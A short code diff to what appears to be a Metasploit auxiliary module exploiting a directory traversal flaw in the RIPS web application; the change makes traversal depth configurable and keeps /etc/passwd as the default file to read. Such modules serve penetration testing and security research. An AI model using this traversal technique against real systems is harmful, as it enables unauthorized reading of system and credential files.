@@ -36,11 +36,12 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(80),
         OptString.new('TARGETURI', [ true,  "The URI path to the web application", "/rips/"]),
         OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])
       ], self.class)
   end
 
   def run_host(ip)
-    traversal = "../../../../../"
+    traversal = "../" * datastore['DEPTH']
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ /^\//
 
